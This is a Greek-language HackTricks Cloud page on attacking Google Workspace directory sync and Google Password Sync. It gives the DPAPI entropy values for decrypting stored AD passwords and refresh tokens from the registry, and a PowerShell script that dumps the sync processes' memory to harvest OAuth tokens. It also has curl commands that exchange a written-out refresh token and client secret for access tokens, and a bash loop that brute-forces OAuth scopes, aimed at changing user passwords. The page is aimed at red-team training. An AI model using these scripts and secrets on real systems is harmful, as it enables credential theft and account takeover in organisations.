Αν γνωρίζετε ποιες ομάδες από το Azure έχουν **ανατεθεί δικαιώματα στο Workspace ή GCP**, θα μπορούσατε απλώς να προσθέσετε έναν συμβιβασμένο χρήστη (ή νέο) σε αυτήν την ομάδα και να αποκτήσετε αυτά τα δικαιώματα.

Υπάρχει μια άλλη επιλογή για να καταχραστείτε υπάρχουσες προνομιούχες ομάδες στο Workspace. Για παράδειγμα, η ομάδα `gcp-organization-admins@<workspace.email>` συνήθως έχει υψηλά προνόμια πάνω στο GCP.

Αν ο συγχρονισμός από, για παράδειγμα, το EntraID, στο Workspace είναι **ρυθμισμένος να αντικαθιστά το domain** του εισαγόμενου αντικειμένου **με το email του Workspace**, θα είναι δυνατό για έναν επιτιθέμενο να δημιουργήσει την ομάδα `gcp-organization-admins@<entraid.email>` στο EntraID, να προσθέσει έναν χρήστη σε αυτήν την ομάδα και να περιμένει μέχρι να συμβεί ο συγχρονισμός όλων των ομάδων.\
**Ο χρήστης θα προστεθεί στην ομάδα `gcp-organization-admins@<workspace.email>` κλιμακώνοντας τα προνόμια στο GCP.**

### Από Google Workspace -> AD/EntraID

Σημειώστε ότι το Workspace απαιτεί credentials με πρόσβαση μόνο για ανάγνωση στο AD ή EntraID για να συγχρονίσει χρήστες και ομάδες. Επομένως, δεν είναι δυνατόν να καταχραστείτε το Google Workspace για να κάνετε οποιαδήποτε αλλαγή στο AD ή EntraID. Έτσι, **αυτό δεν είναι δυνατό** αυτή τη στιγμή.

Δεν γνωρίζω επίσης πού αποθηκεύει η Google τα credentials του AD ή το token του EntraID και δεν μπορείτε να τα ανακτήσετε επαναρυθμίζοντας τον συγχρονισμό (δεν εμφανίζονται στη φόρμα ιστού, πρέπει να τα δώσετε ξανά). Ωστόσο, από το διαδίκτυο μπορεί να είναι δυνατό να καταχραστείτε τη τρέχουσα λειτουργικότητα για **λίστα χρηστών και ομάδων**.

## GPS - Google Password Sync

Αυτό είναι το binary και η υπηρεσία που προσφέρει η Google για να **διατηρεί συγχρονισμένους τους κωδικούς πρόσβασης των χρηστών μεταξύ του AD** και του Workspace. Κάθε φορά που ένας χρήστης αλλάζει τον κωδικό του στο AD, ρυθμίζεται στην Google.

Εγκαθίσταται στο `C:\Program Files\Google\Password Sync` όπου μπορείτε να βρείτε το binary `PasswordSync.exe` για να το ρυθμίσετε και το `password_sync_service.exe` (η υπηρεσία που θα συνεχίσει να τρέχει).

### GPS - Ρύθμιση

Για να ρυθμίσετε αυτό το binary (και την υπηρεσία), χρειάζεται να **δώσετε πρόσβαση σε έναν Super Admin principal στο Workspace**:

* Συνδεθείτε μέσω **OAuth** με την Google και στη συνέχεια θα **αποθηκεύσει ένα token στο μητρώο (κρυπτογραφημένο)**
* Διαθέσιμο μόνο σε Domain Controllers με GUI
* Δίνοντας κάποια **credentials Service Account από το GCP** (json αρχείο) με δικαιώματα να **διαχειρίζεται τους χρήστες του Workspace**
* Πολύ κακή ιδέα καθώς αυτά τα credentials δεν λήγουν ποτέ και θα μπορούσαν να καταχραστούν
* Πολύ κακή ιδέα να δώσετε πρόσβαση σε SA πάνω στο workspace καθώς το SA θα μπορούσε να συμβιβαστεί στο GCP και θα είναι δυνατό να μεταβείτε στο Workspace
* Η Google το απαιτεί για domain controlled χωρίς GUI
* Αυτά τα creds αποθηκεύονται επίσης στο μητρώο

Όσον αφορά το AD, είναι δυνατό να υποδείξετε να χρησιμοποιήσει το τρέχον **context εφαρμογών, ανώνυμο ή κάποια συγκεκριμένα credentials**. Αν επιλεγεί η επιλογή credentials, το **username** αποθηκεύεται μέσα σε ένα αρχείο στο **δίσκο** και ο **κωδικός πρόσβασης** είναι **κρυπτογραφημένος** και αποθηκεύεται στο **μητρώο**.

### GPS - Dumping password and token from disk

{% hint style="success" %}
Σημειώστε ότι [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) είναι ικανό να ανιχνεύσει **GPS**, να αποκτήσει πληροφορίες σχετικά με τη ρύθμιση και **ακόμη και να αποκρυπτογραφήσει τον κωδικό πρόσβασης και το token**.
{% endhint %}

Στο αρχείο **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** είναι δυνατό να βρείτε μέρος της ρύθμισης όπως το **`baseDN`** του AD που έχει ρυθμιστεί και το **`username`** των credentials που χρησιμοποιούνται.

Στο μητρώο **`HKLM\Software\Google\Google Apps Password Sync`** είναι δυνατό να βρείτε το **κρυπτογραφημένο refresh token** και τον **κρυπτογραφημένο κωδικό πρόσβασης** για τον χρήστη AD (αν υπάρχει). Επιπλέον, αν αντί για ένα token, χρησιμοποιούνται κάποια **credentials SA**, είναι επίσης δυνατό να βρείτε αυτά κρυπτογραφημένα σε αυτή τη διεύθυνση μητρώου. Οι **τιμές** μέσα σε αυτό το μητρώο είναι μόνο **προσβάσιμες** από **Διαχειριστές**.

Ο κρυπτογραφημένος **κωδικός πρόσβασης** (αν υπάρχει) είναι μέσα στο κλειδί **`ADPassword`** και είναι κρυπτογραφημένος χρησιμοποιώντας το **`CryptProtectData`** API. Για να τον αποκρυπτογραφήσετε, πρέπει να είστε ο ίδιος χρήστης με αυτόν που ρύθμισε τον συγχρονισμό κωδικών πρόσβασης και να χρησιμοποιήσετε αυτή την **entropy** όταν χρησιμοποιείτε το **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

Το κρυπτογραφημένο token (αν υπάρχει) είναι μέσα στο κλειδί **`AuthToken`** και είναι κρυπτογραφημένο χρησιμοποιώντας το **`CryptProtectData`** API. Για να το αποκρυπτογραφήσετε, πρέπει να είστε ο ίδιος χρήστης με αυτόν που ρύθμισε τον συγχρονισμό κωδικών πρόσβασης και να χρησιμοποιήσετε αυτή την **entropy** όταν χρησιμοποιείτε το **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
Επιπλέον, είναι επίσης κωδικοποιημένο χρησιμοποιώντας base32hex με το λεξιλόγιο **`0123456789abcdefghijklmnopqrstv`**.

Οι τιμές entropy βρέθηκαν χρησιμοποιώντας το εργαλείο. Ρυθμίστηκε να παρακολουθεί τις κλήσεις προς το **`CryptUnprotectData`** και **`CryptProtectData`** και στη συνέχεια το εργαλείο χρησιμοποιήθηκε για να εκκινήσει και να παρακολουθήσει το `PasswordSync.exe`, το οποίο θα αποκρυπτογραφήσει τον ρυθμισμένο κωδικό πρόσβασης και το auth token στην αρχή και το εργαλείο θα **δείξει τις τιμές για την entropy που χρησιμοποιήθηκε** και στις δύο περιπτώσεις:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

Σημειώστε ότι είναι επίσης δυνατό να δείτε τις **αποκρυπτογραφημένες** τιμές στην είσοδο ή έξοδο των κλήσεων σε αυτές τις APIs επίσης (σε περίπτωση που κάποια στιγμή το Winpeas σταματήσει να λειτουργεί).

Σε περίπτωση που ο Password Sync έχει **ρυθμιστεί με credentials SA**, θα αποθηκευτεί επίσης σε κλειδιά μέσα στο μητρώο **`HKLM\Software\Google\Google Apps Password Sync`**.

### GPS - Dumping tokens from memory

Ακριβώς όπως με το GCPW, είναι δυνατό να κάνετε dump τη μνήμη της διαδικασίας του `PasswordSync.exe` και των διαδικασιών `password_sync_service.exe` και θα είστε σε θέση να βρείτε refresh και access tokens (αν έχουν ήδη παραχθεί).\
Υποθέτω ότι θα μπορούσατε επίσης να βρείτε τα ρυθμισμένα credentials του AD.

<details>

<summary>Dump <code>PasswordSync.exe</code> και τις διαδικασίες <code>password_sync_service.exe</code> και αναζητήστε tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - Δημιουργία διαπιστευτηρίων πρόσβασης από ανανεωτικά διαπιστευτήρια

Χρησιμοποιώντας το ανανεωτικό διαπιστευτήριο, είναι δυνατή η δημιουργία διαπιστευτηρίων πρόσβασης χρησιμοποιώντας αυτό και το αναγνωριστικό πελάτη και το μυστικό πελάτη που καθορίζονται στην παρακάτω εντολή:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
Σημειώστε ότι ακόμη και αν έχετε ένα refresh token, δεν είναι δυνατόν να ζητήσετε οποιοδήποτε scope για το access token, καθώς μπορείτε να ζητήσετε μόνο τα **scopes που υποστηρίζονται από την εφαρμογή όπου δημιουργείτε το access token**.

Επίσης, το refresh token δεν είναι έγκυρο σε κάθε εφαρμογή.
{% endhint %}

Από προεπιλογή, το GPS δεν θα έχει πρόσβαση ως χρήστης σε κάθε πιθανό OAuth scope, οπότε χρησιμοποιώντας το παρακάτω σενάριο μπορούμε να βρούμε τα scopes που μπορούν να χρησιμοποιηθούν με το `refresh_token` για να δημιουργήσουμε ένα `access_token`:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Και αυτό είναι το αποτέλεσμα που πήρα τη στιγμή που έγραφα:
```
https://www.googleapis.com/auth/admin.directory.user
```
Το ίδιο που θα λάβετε αν δεν υποδείξετε καμία έκταση.

{% hint style="danger" %}
Με αυτή την έκταση θα μπορούσατε **να τροποποιήσετε τον κωδικό πρόσβασης ενός υπάρχοντος χρήστη για να κλιμακώσετε τα προνόμια**.
{% endhint %}

## Αναφορές

* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
